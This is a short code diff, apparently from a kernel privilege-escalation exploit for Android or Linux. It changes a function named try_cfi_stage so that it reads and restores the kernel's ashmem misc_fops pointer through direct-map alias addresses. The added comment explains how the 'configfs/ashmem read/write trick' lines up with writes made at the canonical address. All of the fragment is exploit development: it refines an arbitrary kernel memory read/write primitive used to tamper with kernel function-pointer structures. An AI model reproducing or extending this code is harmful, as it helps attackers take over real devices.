@@ -353,7 +353,15 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     return 0;
   }
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  /*
+   * The PI-walk writes misc_fops at its canonical VA (the kernel needs
+   * the canonical mapping to dereference it), but the userspace
+   * configfs/ashmem read/write trick only works through the direct-map
+   * aliases (0xffffff80...).  data_direct_addr() gives the physical
+   * alias of the same page, so the readback and the restore write see
+   * the same bytes the kernel wrote at canonical misc_fops.
+   */
+  uintptr_t misc_fops = data_direct_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
